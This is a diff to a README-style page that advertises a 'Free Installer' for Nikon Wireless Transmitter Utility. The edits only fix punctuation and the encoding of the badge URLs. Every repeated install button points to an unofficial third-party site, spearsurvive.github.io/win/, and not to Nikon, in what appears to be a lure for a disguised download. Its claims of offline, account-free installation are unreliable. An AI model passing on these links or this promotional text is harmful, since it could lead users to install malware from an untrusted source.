@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Camera+Software-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Nikon Wireless Transmitter Utility Free Installer** — Nikon Wireless Transmitter Utility is a free application for configuring and using Nikon's wireless transmitter accessories (WT-7, WT-8) for network-based tethered shooting and FTP image transfer from compatible Nikon cameras.. Works without internet access, no account required. Full offline installation.
+**💻 Nikon Wireless Transmitter Utility Free Installer** — Nikon Wireless Transmitter Utility is a free application for configuring and using Nikon's wireless transmitter accessories (WT-7, WT-8) for network-based tethered shooting and FTP image transfer from compatible Nikon cameras. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Nikon Wireless Transmitter Utility](https://img.shields.io/badge/⬇_Install_Nikon%20Wireless%20Transmitter%20Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon Wireless Transmitter Utility](https://img.shields.io/badge/⬇_Install_Nikon+Wireless+Transmitter+Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Nikon Wireless Transmitter Utility is a free application for configuring and usi
 
 <div align="center">
 
-[![⬇ Install Nikon Wireless Transmitter Utility](https://img.shields.io/badge/⬇_Install_Nikon%20Wireless%20Transmitter%20Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon Wireless Transmitter Utility](https://img.shields.io/badge/⬇_Install_Nikon+Wireless+Transmitter+Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Nikon Wireless Transmitter Utility is a free application for configuring and usi
 
 ---
 
-**Nikon Wireless Transmitter Utility Free Installer** — Nikon Wireless Transmitter Utility is a free application for configuring and using Nikon's wireless transmitter accessories (WT-7, WT-8) for network-based tethered shooting and FTP image transfer from compatible Nikon cameras.. Install without internet connection today!
+**Nikon Wireless Transmitter Utility Free Installer** — Nikon Wireless Transmitter Utility is a free application for configuring and using Nikon's wireless transmitter accessories (WT-7, WT-8) for network-based tethered shooting and FTP image transfer from compatible Nikon cameras. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Nikon Wireless Transmitter Utility](https://img.shields.io/badge/⬇_Install_Nikon%20Wireless%20Transmitter%20Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon Wireless Transmitter Utility](https://img.shields.io/badge/⬇_Install_Nikon+Wireless+Transmitter+Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
